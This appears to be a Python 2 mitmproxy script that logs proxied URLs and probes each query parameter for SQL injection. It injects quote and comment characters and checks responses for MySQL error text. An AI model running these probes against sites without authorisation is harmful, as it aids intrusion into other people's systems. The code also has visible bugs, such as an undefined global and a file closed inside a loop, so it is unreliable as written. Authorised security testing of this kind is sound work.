import sys
import urlparse
from copy import deepcopy
import requests

# this will log every request to the proxy
def request(context, flow):
    global history
    url = flow.request.url
    if url not in history: # evaluating duplicates
        # check the queryString
        q = flow.request.get_query()
        if q:
            # q["isadmin"] = ["true"] # static queryString
            injector_checker(flow.request.url)
            flow.request_set_query(q)

        f = open('httplogs.txt', 'a+') # txt file
        f.write(flow.request.url + '\n') # storing the URLs
        f.close()
        history.append(url)
    else:
        pass

def injector_checker (url):
    # errors
    errors = ['Mysql','error in your SQL']
    # SQLinjection sql
    injections = ['\'','\"',';--']
    f = open('sqlinjection.txt','a+')
    a = urlparse.urlparse(url) # querystring creation
    query = a.query.split('&')
    query_len = len(query) # parameters length
    while query_len != 0:
        querys = deepcopy(query)
        querys[query_len - 1] = querys[query_len - 1].split('=')[0] + ' = LOL' # replacing param with LOL
        newq='&'.join(querys)
        url_to_test = a.scheme+'://'+a.netloc+a.path+'?'+newq # building
        query_len -= 1
        for i in injections:
            req = requests.get(url_to_test.replace('LOL',i))
            print req.content
            for err in errors:
                if req.content.find(err) != - 1:
                    res = req.url + ";" + err
                    f.write(res)
                    f.close()
